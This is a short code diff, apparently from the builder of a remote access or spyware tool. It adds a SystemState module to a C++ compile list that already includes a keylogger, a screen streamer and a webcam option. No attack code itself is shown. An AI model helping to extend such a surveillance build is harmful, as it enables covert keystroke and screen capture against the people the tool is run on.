@@ -58,7 +58,8 @@ public class Compiler implements ActionListener {
                     "keylogger/KeyLogger.cpp " +
                     "permission/Permission.cpp " +
                     "box_message/MessageBoxGUI.cpp " +
-                    "screen/ScreenStreamer.cpp ");
+                    "screen/ScreenStreamer.cpp " +
+                    "state/SystemState.cpp ");
             if (checkBoxes[0].isSelected()) {
                 modifier.addInclude("#define WEBCAM");
                 command.append(
